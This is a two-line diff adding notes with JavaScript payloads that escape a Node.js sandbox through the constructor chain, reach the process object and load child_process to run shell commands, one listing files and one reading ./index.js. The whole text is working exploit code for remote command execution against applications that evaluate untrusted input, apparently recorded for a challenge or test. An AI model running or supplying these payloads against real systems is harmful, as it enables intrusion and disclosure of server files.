@@ -1,0 +1,2 @@
+payload to list files : const process = this.constructor.constructor('return this.process')(); process.mainModule.constructor._load('child_process').spawnSync("ls", [], {stdio: "pipe"}).stdout.toString()
+payload to cat index.js : const process = this.constructor.constructor('return this.process')(); process.mainModule.constructor._load('child_process').spawnSync("cat", ["./index.js"], {stdio: "pipe"}).stdout.toString()
